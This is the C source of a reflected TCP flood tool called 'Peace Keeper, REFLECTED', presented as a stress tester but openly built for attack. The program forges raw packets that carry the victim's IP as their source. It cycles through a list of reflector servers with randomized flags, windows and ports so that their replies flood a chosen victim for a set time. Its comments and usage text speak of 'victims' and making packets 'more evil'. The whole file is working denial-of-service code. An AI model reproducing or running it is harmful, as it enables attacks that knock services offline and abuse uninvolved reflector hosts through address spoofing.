/*                   .ed"""" """$$$$be.                 FLAG LIST:       1 = FIN
                   -"           ^""**$$$e.                               2 = SYN
                 ."                   '$$$c                              3 = FIN+SYN
                /                      "4$$b                             4 = RST
               d  3                      $$$$                            5 = RST+FIN
               $  *                   .$$$$$$                            6 = RST+SYN
              .$  ^c           $$$$$e$$$$$$$$.                           7 = RST+SYN+FIN
              d$L  4.         4$$$$$$$$$$$$$$b                           8 = PUSH
              $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$                           9 = PUSH+FIN
  e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$                          10 = PUSH+SYN
 z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c              11 = PUSH+SYN+FIN
4$$$$L        $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.              12 = PUSH+RST
^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$             13 = PUSH+RST+FIN
  "**$$$ec   "   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""              14 = PUSH+RST+SYN
        "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"               15 = PUSH+RST+SYN+FIN
          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"                     16 = ACK
             "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"                       17 = ACK+FIN
               "*$$$  *=%4.$ L L$ P3$$$F $$$P"                          18 = ACK+SYN
                  "$   "%*ebJLzb$e$$$$$b $P"                            19 = ACK+SYN+FIN
                    %..      4$$$$$$$$$$ "                              20 = ACK+RST
                     $$$e   z$$$$$$$$$$%                                21 = ACK+RST+FIN
                      "*$c  "$$$$$$$P"                                  22 = ACK+RST+SYN
                       ."""*$$$$$$$$bc                                  23 = ACK+RST+SYN+FIN
                    .-"    .$***$$$"""*e.                               24 = ACK+PUSH
                 .-"    .e$"     "*$c  ^*b.                             25 = ACK+PUSH+FIN
          .=*""""    .e$*"          "*bc  "*$e..                        26 = ACK+PUSH+SYN
        .$"        .z*"               ^*$e.   "*****e.                  27 = ACK+PUSY+SYN+FIN
        $$ee$c   .d"                     "*$.        3.                 28 = ACK+PUSH+RST
        ^*$E")$..$"                         *   .ee==d%                 29 = ACK+PUSH+RST+FIN
           $.d$$$*                           *  J$$$e*                  30 = ACK+PUSH+RST+SYN
            """""                              "$$$"                    31 = ACK+PUSH+RST+SYN+FIN
                                                                        32 = URGENT
                                                                        63 = ACK+PUSH+RST+SYN+FIN+URG
Peace Keeper, REFLECTED: A TCP/IP IPv4 network stress tool.             64 = Randomized flags set in an array.
The traditional way of keeping the peace amongst the crowd.             65 = Digital Gangsta Stomper (special flags)
By darkness@efnet, greetz vae@efnet
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdarg.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <signal.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <stdbool.h>
#include <pthread.h>

#define ENDIAN_LITTLE
#define WSCALE
#define STRINGLEN 64

int rawsock = 0;
unsigned int start;
unsigned long long int packets = 0;
unsigned short databytes = 0;
unsigned int server_count = 0;
unsigned int reflectorAddr;
unsigned short reflectorPort;
unsigned int pktcount, pktsent;

unsigned short csum (unsigned short *addr, int len)
{
    int nleft = len;
    unsigned int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;

    while (nleft > 1)
    {
        sum += *w++;
        nleft -= 2;
    }
    if (nleft == 1)
    {
        *(unsigned char *) (&answer) = *(unsigned char *) w;
        sum += answer;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}

struct tcphdr2
{
    unsigned short th_sport;    /* source port */
    unsigned short th_dport;    /* destination port */
    unsigned int th_seq;                /* sequence number */
    unsigned int th_ack;                /* acknowledgement number */
    unsigned char th_x2:4;      /* (unused) */
    unsigned char th_off:4;     /* data offset */
    unsigned char th_flags;
    unsigned short th_win;      /* window */
    unsigned short th_sum;      /* checksum */
    unsigned short th_urp;      /* urgent pointer */
};

struct ip
{
    #ifdef ENDIAN_LITTLE
    unsigned int ip_hl:4;               /* header length */
    unsigned int ip_v:4;                /* version */
    #else
    unsigned int ip_v:4;                /* version */
    unsigned int ip_hl:4;               /* header length */
    #endif
    unsigned char ip_tos;               /* type of service */
    unsigned short ip_len;      /* total length */
    unsigned short ip_id;               /* identification */
    unsigned short ip_off;      /* fragment offset field */
    #define IP_RF 0x8000                /* reserved fragment flag */
    #define IP_DF 0x4000                /* dont fragment flag */
    #define IP_MF 0x2000                /* more fragments flag */
    #define IP_OFFMASK 0x1fff   /* mask for fragmenting bits */
    unsigned char ip_ttl;               /* time to live */
    unsigned char ip_p;         /* protocol */
    unsigned short ip_sum;      /* checksum */
    struct in_addr ip_src, ip_dst;      /* source and dest address */
};

struct reflector
{
    struct in_addr ip4_addr;
    unsigned short dport;
};

struct reflector *reflectors = NULL;

struct ph
{                               /* rfc 793 tcp pseudo-header */
    unsigned long saddr, daddr;
    char mbz;
    char ptcl;
    unsigned short tcpl;
};

struct tcp_opthdr
{
    unsigned char op0;
    unsigned char op1;
    unsigned char op2;
    unsigned char op3;
    unsigned char op4;
    unsigned char op5;
    unsigned char op6;
    unsigned char op7;
    /* we only need this if we use window scaling and timestamps */
    unsigned char op8;
    unsigned char op9;
    unsigned char op10;
    unsigned char op11;
    unsigned char op12;
    unsigned char op13;
    unsigned char op14;
    unsigned char op15;
    unsigned char op16;
    unsigned char op17;
    unsigned char op18;
    unsigned char op19;
};

struct
{
    char buf[1551];             /* 64 kbytes for the packet */
    char ph[1551];              /* 64 bytes for the paeudo header packet */
} tcpbuf;

// Assemble tcp header.
struct ip *xf_iphdr = (struct ip *) tcpbuf.buf;
struct tcphdr2 *xf_tcphdr = (struct tcphdr2 *) (tcpbuf.buf + sizeof (struct ip));
struct tcp_opthdr *xf_tcpopt = (struct tcp_opthdr *) (tcpbuf.buf + sizeof (struct ip) + sizeof (struct tcphdr2));
// Assemble pseudo header
struct ph *ps_iphdr = (struct ph *) tcpbuf.ph;
struct tcphdr2 *ps_tcphdr =(struct tcphdr2 *) (tcpbuf.ph + sizeof (struct ph));
struct tcp_opthdr *ps_tcpopt = (struct tcp_opthdr *) (tcpbuf.ph + sizeof (struct ph) + sizeof (struct tcphdr2));

unsigned int lookup (char *hostname)
{
    struct hostent *name;
    unsigned int address;

    if ((address = inet_addr (hostname)) != -1)
        return address;
    if ((name = gethostbyname (hostname)) == NULL)
        return -1;

    memcpy (&address, name->h_addr, name->h_length);
    return address;
}

void handle_exit()
{
    printf ("-> Flood completed, %llu packets sent, %zu seconds, %llu packets/sec\n", packets, time (NULL) - start, packets / (time (NULL) - start));
    exit(0);
}

struct reflector *read_servers(char *filename)
{
    FILE *fp;
    uint32_t len = 0;
    uint32_t i;
    struct reflector *reflectors;
    char buffer[STRINGLEN];
    char input[2][STRINGLEN];
    char *p = NULL;

    if (!(fp = fopen(filename, "r")))
    {
        fprintf(stderr, "error: can't open file %s\n", filename);
        exit(-1);
    }

    len = 4096 * sizeof(struct reflector);
    reflectors = malloc(len);

    while (fgets(buffer, sizeof(buffer), fp))
    {
        if(server_count >= (len / sizeof(struct reflector)) -2)
        {
            reflectors = realloc(reflectors, len + (4096 * sizeof(struct reflector)));
            len += 4096 * sizeof(struct reflector);
        }

        if(buffer[strlen(buffer) - 1] == '\n')
            buffer[strlen(buffer) - 1] = 0;

        input[0][0] = 0;
        input[1][0] = 0;
        p = NULL;

        for(i = 0; i < 2; i++)
        {
            if(!(p = strtok(p ? NULL : buffer, " ")))
                break;

            strncpy(input[i], p, sizeof(input[i]) - 1);
        }

        if(!input[1][0])
            continue;

        if((reflectors[server_count].ip4_addr.s_addr = lookup(input[0])) == -1)
            continue;

        reflectors[server_count].dport = atoi(input[1]);
        server_count++;
    }
    printf("-> Loaded %u reflectors.\n", server_count);

    if(!server_count)
    {
        fprintf(stderr, "Error: 0 reflectors found!\n");
        exit(-1);
    }

    reflectors[server_count].dport = 0;
    return(reflectors);
}

void attack (unsigned int dest, unsigned short dstport, unsigned short flags, unsigned int ttime)
{
    struct sockaddr_in sin;

    sin.sin_family = AF_INET; // set socket family
    xf_iphdr->ip_off = htons (0x4000);
    xf_iphdr->ip_id = htons (random ());  /* random IP id */
    xf_iphdr->ip_p = IPPROTO_TCP;
    xf_iphdr->ip_v = 4;
    xf_iphdr->ip_hl = 5;
    xf_iphdr->ip_tos = 0;
    ps_iphdr->mbz = 0;
    xf_tcphdr->th_urp = 0;
    ps_iphdr->ptcl = IPPROTO_TCP;

    /* large windows are more evil */
    xf_tcphdr->th_win = htons(((rand()%40000)+25535));

    /* larger ttls are also more evil */
    xf_iphdr->ip_ttl = 255;

    /* set the flags */
    xf_tcphdr->th_flags = flags;

    /* source ip */
    ps_iphdr->saddr = xf_iphdr->ip_src.s_addr;
    xf_iphdr->ip_src.s_addr = dest;

    /* option headers */
    /* mss */
    xf_tcpopt->op0 = 2;
    xf_tcpopt->op1 = 4;
    xf_tcpopt->op2 = 6;
    xf_tcpopt->op3 = 0xb4;

    /* sackok */
    xf_tcpopt->op4 = 4;
    xf_tcpopt->op5 = 2;

    /* timestamp */
    xf_tcpopt->op6 = 8;
    xf_tcpopt->op7 = 0x0a;
    xf_tcpopt->op8 = rand();
    xf_tcpopt->op9 = rand();
    xf_tcpopt->op10 = rand();
    xf_tcpopt->op11 = rand();
    xf_tcpopt->op12 = 0;
    xf_tcpopt->op13 = 0;
    xf_tcpopt->op14 = 0;
    xf_tcpopt->op15 = 0;
    /* nop */
    xf_tcpopt->op16 = 0x01;
    /* window scaling */
    xf_tcpopt->op17 = 0x03;
    xf_tcpopt->op18 = 0x03;
    xf_tcpopt->op19 = 0x04;

    // Set source and destination ports.
    xf_tcphdr->th_sport = htons(dstport);
    ps_tcphdr->th_sport = htons(dstport);

    // If the packet is a SYN packet, set the SEQ and ACK accordingly, else randomize it.
    if(xf_tcphdr->th_flags == 2)
    {
        xf_tcphdr->th_seq = htonl(0);
        xf_tcphdr->th_ack = htonl(0);
    }
    else
    {
        xf_tcphdr->th_seq = htonl(rand());
        xf_tcphdr->th_ack = htonl(rand());
    }

    // Calculate IP length
    xf_iphdr->ip_len = htons (sizeof (struct ip) + sizeof (struct tcphdr2) + sizeof (struct tcp_opthdr));

    // Calculate TCP length.
    ps_iphdr->tcpl = htons (sizeof (struct tcphdr2) + sizeof (struct tcp_opthdr) + databytes);
    xf_tcphdr->th_off = (sizeof (struct tcphdr2) + sizeof (struct tcp_opthdr)) / 4;

    if(flags == 32)
        printf ("-> TCP Flag Randomization [✔️]\n");

    if(dstport == 0)
        printf("-> TCP Port randomization [✔️]\n");

    printf ("TCP Packet Size: %zu\n", sizeof (struct ph) + sizeof (struct tcphdr2) + sizeof (struct tcp_opthdr) + databytes);

    unsigned int z = 1;

    reflectorAddr = htonl(reflectors[z].ip4_addr.s_addr);
    reflectorPort = htons(reflectors[z].dport);

    ps_iphdr->daddr = reflectorAddr;
    xf_iphdr->ip_dst.s_addr = reflectorAddr;
    ps_tcphdr->th_dport = reflectorPort;
    xf_tcphdr->th_dport =  reflectorPort;
    sin.sin_port = reflectorPort;

    memcpy (ps_tcphdr, xf_tcphdr, sizeof (struct tcphdr2));
    memcpy (ps_tcpopt, xf_tcpopt, sizeof (struct tcp_opthdr));

    while(true)
    {
        // Logic for packets per host.
        if(pktsent >= pktcount)
        {
            reflectorAddr = htonl(reflectors[z].ip4_addr.s_addr);
            reflectorPort = htons(reflectors[z].dport);
            pktsent = 0;
            z++;
        }

        // Set destination address and port.
        ps_iphdr->daddr = htonl(reflectorAddr);
        xf_iphdr->ip_dst.s_addr = htonl(reflectorAddr);
        xf_tcphdr->th_dport = reflectorPort;
        ps_tcphdr->th_dport = reflectorPort;
        sin.sin_port = reflectorPort;
        sin.sin_addr.s_addr = ps_iphdr->daddr;

        // Randomize between ACK & SYN packets if chosen.
        if(flags == 32)
            xf_tcphdr->th_flags = rand() > RAND_MAX/2 ? 2 : 16;

        // Randomize TCP window
        xf_tcphdr->th_win = htons(((rand()%40000)+25535));

        // Randomize TCP TSVal
        xf_tcpopt->op8 = rand();
        xf_tcpopt->op9 = rand();
        xf_tcpopt->op10 = rand();
        xf_tcpopt->op11 = rand();

        // If the packet is a SYN packet, set the SEQ and ACK accordingly, else randomize it.
        if(xf_tcphdr->th_flags == 2)
        {
            xf_tcphdr->th_seq = htonl(0);
            xf_tcphdr->th_ack = htonl(0);
        }
        else
        {
            xf_tcphdr->th_seq = htonl(rand());
            xf_tcphdr->th_ack = htonl(rand());
        }

        if(dstport == 0)
        {
            xf_tcphdr->th_sport = htons(((rand()%65534)+1));
            ps_tcphdr->th_sport = xf_tcphdr->th_sport;
        }
        // Calculate IP length & offset
        xf_iphdr->ip_len = htons (sizeof (struct ip) + sizeof (struct tcphdr2) + sizeof (struct tcp_opthdr));
        xf_iphdr->ip_off = htons (0x4000);

        // Calculate TCP offset
        xf_tcphdr->th_off = (sizeof (struct tcphdr2) + sizeof (struct tcp_opthdr)) / 4;

        // Calculate TCP checksum
        xf_tcphdr->th_sum = csum ((unsigned short *) tcpbuf.ph, sizeof (struct ph) + sizeof (struct tcphdr2) + sizeof (struct tcp_opthdr) + databytes);
        xf_iphdr->ip_sum = xf_tcphdr->th_sum;

        // Duplicate.
        memcpy (ps_tcphdr, xf_tcphdr, sizeof (struct tcphdr2));
        memcpy (ps_tcpopt, xf_tcpopt, sizeof (struct tcp_opthdr));

        // Send the packet to the victim(s).
        sendto (rawsock, tcpbuf.buf, sizeof (struct ip) + sizeof (struct tcphdr2) + sizeof (struct tcp_opthdr) + databytes, 0, (struct sockaddr *) &sin, sizeof (sin));
        packets++, pktsent++;

        if(z >= server_count)
        {
            z = 1;
            pktsent = 0;
        }

        if (time (NULL) - start >= ttime)
        {
            handle_exit();
        }
    }
}

int main (int argc, char **argv)
{
    int hincl = 1;
    char *listName;
    unsigned char flags, ttl;
    unsigned int dest, ttime;
    unsigned short dstport, srcport, winsize;

    /* parse arguments */
    if(argv[1] == NULL || !strcmp(argv[1], "") || strcmp(argv[1], "29A"))
    {
        printf ("-> Ah ah ah! You didn't say the magic word, deleting system file!\n");
        exit(0);
    }
    else
    {
        if (argc < 7)
        {
            printf("-> The supreme art of war is to subdue the enemy without fighting. - Peace Keeper, REFLECTED.\n");
            printf ("USAGE : %s <key> <dest> <destport> <list> <flags> <pkts> <time>\n", argv[0]);
            printf ("key        = required to run the code\n");
            printf ("dest       = the victim ip/host\n");
            printf ("destport   = port to attack on the victim\n");
            printf ("list       = the list to read from\n");
            printf ("flags      = flags to use (32 for ACK+SYN)\n");
            printf ("pkts       = how many packets should we send to each reflector ;)\n");
            printf ("time       = time in seconds to run the attack\n");
            exit (0);
        }
    }

    /* allocate socket */
    rawsock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (rawsock <= 0)
    {
        printf ("Error opening raw socket\n");
        exit (-1);
    }
    setsockopt(rawsock, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

    dest = lookup(argv[2]);
    dstport = atoi(argv[3]);
    listName = argv[4];
    flags = atoi(argv[5]);
    pktcount = atoi(argv[6]);
    ttime = atoi(argv[7]);
    databytes = 0;

    signal (SIGINT, handle_exit);
    signal (SIGTERM, handle_exit);
    signal (SIGQUIT, handle_exit);

    reflectors = read_servers(listName);

    start = time (NULL);
    attack (dest, dstport, flags, ttime);
}
